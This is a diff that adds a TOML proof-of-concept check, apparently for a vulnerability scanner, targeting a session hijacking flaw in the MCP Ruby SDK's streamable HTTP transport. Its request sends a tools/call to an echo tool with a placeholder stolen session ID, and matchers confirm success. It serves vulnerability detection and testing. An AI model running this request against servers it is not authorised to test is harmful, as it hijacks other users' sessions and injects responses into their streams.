@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "验证 MCP Ruby SDK StreamableHTTPTransport 会话劫持漏洞：攻击者获取有效会话 ID 后，向 MCP 服务端发送携带 Mcp-Session-Id 头的 POST 请求，服务端未验证会话 ID 与请求者的绑定关系，直接执行 tools/call 并将响应注入受害者 SSE 流中"
+id = "POC-AVE-2026-0960"
+name = "CVE-2026-67431 PoC"
+severity = "high"
+tags = ["ave-2026-0960"]
+vuln_id = [
+    "CVE-2026-67431",
+    "AVE-2026-0960",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","method":"tools/call","id":1,"params":{"name":"echo","arguments":{"message":"session_poison_test"}}}'
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json, text/event-stream"
+Content-Type = "application/json"
+Mcp-Session-Id = "stolen-session-id-here"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["result"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    202,
+]
+type = "status"
